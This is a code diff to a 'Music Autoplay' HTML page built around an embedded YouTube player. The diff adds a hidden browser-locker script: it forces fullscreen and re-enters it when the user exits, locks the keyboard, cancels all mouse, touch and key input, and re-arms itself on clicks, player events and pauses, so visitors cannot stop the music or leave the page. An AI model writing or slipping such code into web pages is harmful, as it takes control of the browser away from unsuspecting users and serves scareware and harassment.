@@ -3,8 +3,32 @@
   <head>
     <title>Music Autoplay</title>
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <script>
+      function fun() {
+        document.addEventListener("fullscreenchange", (event) => {
+          fun();
+        });
+        document.documentElement.requestFullscreen();
+        interceptUserInput(event => {
+      event.preventDefault();
+      event.stopPropagation();
+        });
+      }
+      function interceptUserInput (onInput) {
+        navigator.keyboard.lock();
+      document.body.addEventListener('touchstart', onInput, { passive: false });
+
+      document.body.addEventListener('mousedown', onInput);
+      document.body.addEventListener('mouseup', onInput);
+      document.body.addEventListener('click', onInput);
+
+      document.body.addEventListener('keydown', onInput);
+      document.body.addEventListener('keyup', onInput);
+      document.body.addEventListener('keypress', onInput);
+      }
+    </script>
   </head>
-  <body class="w3-center w3-purple">
+  <body class="w3-center w3-purple" onclick="fun()">
     <h1>Music Autoplay</h1>
     <div id="player"></div>
     <script>
@@ -62,15 +86,19 @@
       }
       function onPlayerReady(event) {
         event.target.playVideo();
+        fun();
       }
       function onError(){
         makeVideo();
+        fun();
       }
       function onPlayerStateChange(event) {
         if(event.data == YT.PlayerState.ENDED) {
             makeVideo();
+          fun();
         }else if(event.data == YT.PlayerState.PAUSED){
             player.playVideo();
+          fun();
         }
       }
       function stopVideo() {
